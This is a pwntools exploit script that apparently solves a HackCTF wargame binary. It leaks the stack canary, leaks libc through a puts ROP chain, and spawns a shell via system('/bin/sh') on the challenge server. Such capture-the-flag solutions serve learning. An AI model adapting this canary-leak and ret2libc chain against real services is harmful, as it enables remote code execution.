from pwn import *
r=remote("ctf.j0n9hyun.xyz",3027)
#r=process("/GitHub/Writeup/Wargame/HackCTF/World_best_encryption_tool")
b=ELF("/GitHub/Writeup/Wargame/HackCTF/World_best_encryption_tool")
context.log_level='debug'
prdi=0x4008e3 # pop rdi ; ret
main=b.symbols['main']

system_off=0x45390
binsh_off=0x18cd57
setvbuf_off=0x6fe70
#=====canary leak=====#
pay1='x'*57

r.sendlineafter("text)\n",pay1)
r.recvuntil("\n")
r.recv(57)
canary=u64(b'\x00'+r.recv(7))
log.info(hex(canary))

r.sendlineafter("No)\n","Yes")
r.sendlineafter("text)\n","snwo.tistory.com")
#=====leak libc=====#

pay2=b'x'*0x7c
pay2+=p64(canary)
pay2+=p64(0xdeadbeef)
pay2+=p64(prdi)
pay2+=p64(b.got['setvbuf'])
pay2+=p64(b.plt['puts'])
pay2+=p64(main)

r.sendlineafter("No)\n",pay2)
r.recvuntil("option")
libcbase=u64(r.recv(6).ljust(8,b'\x00'))-setvbuf_off
system=libcbase+system_off
binsh=libcbase+binsh_off

log.success(hex(libcbase))

#=====system('/bin/sh')=====#
r.sendlineafter("text)\n","snwo.tistory.com")
pay3=b'x'*0x7c
pay3+=p64(canary)
pay3+=p64(0xdeadbeef)
pay3+=p64(prdi)
pay3+=p64(binsh)
pay3+=p64(system)
#pause()
r.sendlineafter("No)\n",pay3)
r.interactive()
